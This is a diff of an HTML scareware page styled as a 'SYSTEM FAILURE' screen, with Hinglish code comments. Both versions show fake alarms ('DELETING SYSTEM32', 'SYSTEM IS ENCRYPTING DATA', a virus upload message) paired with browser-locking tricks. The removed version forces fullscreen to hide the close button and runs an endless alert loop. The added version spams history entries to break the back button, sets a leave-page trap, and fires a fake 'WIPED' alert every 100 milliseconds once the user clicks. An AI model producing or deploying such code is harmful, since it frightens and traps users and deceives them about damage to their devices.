@@ -3,52 +3,40 @@
 <head>
     <title>🚨 SYSTEM FAILURE 🚨</title>
 </head>
-<body style="background-color: black; color: red; text-align: center; font-family: courier;">
-    <h1 id="status">DELETING SYSTEM32...</h1>
-    <p>DO NOT CLOSE THIS WINDOW OR PHONE WILL BRICK</p>
+<body style="background-color: black; color: red; text-align: center; padding: 100px 20px;">
+    <h1 style="font-size: 50px;">⚠️ 404 CRITICAL ERROR</h1>
+    <p>DO NOT PRESS BACK - SYSTEM IS ENCRYPTING DATA</p>
+    <button id="fixBtn" style="padding: 20px; background: red; color: white; border: none; font-weight: bold;">CLICK HERE TO FIX ERROR</button>
 
     <script>
-        // 1. Full Screen Force (Isse 'X' button chup jata hai)
-        function requestFullScreen() {
-            var el = document.documentElement;
-            if (el.requestFullscreen) el.requestFullscreen();
-            else if (el.mozRequestFullScreen) el.mozRequestFullScreen();
-            else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
-            else if (el.msRequestFullscreen) el.msRequestFullscreen();
-        }
-
-        // 2. History Spam (Isse 'Back' button kaam nahi karega)
-        for (var i = 0; i < 100; i++) {
-            window.history.pushState(null, "", window.location.href);
-        }
-        window.onpopstate = function() {
-            window.history.pushState(null, "", window.location.href);
-            alert("⚠️ ERROR: Security Breach! Access Denied.");
+        // 1. Back button par alert trigger karna
+        window.onbeforeunload = function() {
+            return "Are you sure you want to leave? System format in progress!";
         };
 
-        // 3. The Infinite Memory Hogger
-        function startFreeze() {
-            requestFullScreen();
-            // Naya alert aate hi purana loop restart hoga
-            while(true) {
-                alert("🔴 CRITICAL ERROR: Storage sector 0x889 formatted.");
-                alert("💀 VIRUS STATUS: 99% Uploaded.");
-                alert("📱 DEVICE STATUS: Overheating...");
-                alert("😂 VELOCITA: Browser is now locked!");
+        // 2. Button click hone par loop start hoga (User interaction)
+        document.getElementById('fixBtn').onclick = function() {
+            startHeavyLoop();
+        };
+
+        function startHeavyLoop() {
+            // History spamming to break the back button
+            for (var i = 0; i < 50; i++) {
+                window.history.pushState(null, "", window.location.href);
             }
+            
+            // Loop jo user ko busy rakhega
+            setInterval(function() {
+                alert("🔴 SECTOR 0x00" + Math.floor(Math.random() * 999) + " WIPED!");
+            }, 100); 
         }
 
-        // Jab user screen par kahin bhi click karega, full screen active ho jayega
-        document.onclick = function() {
-            startFreeze();
-        }
-        
-        window.onload = function() {
-            setTimeout(function() {
-                alert("CLICK 'OK' TO REPAIR SYSTEM");
-            }, 1000);
-        }
+        // Agar user screen par kahin bhi touch kare toh loop chalu
+        window.onclick = function() {
+            startHeavyLoop();
+        };
     </script>
 </body>
 </html>
+
 
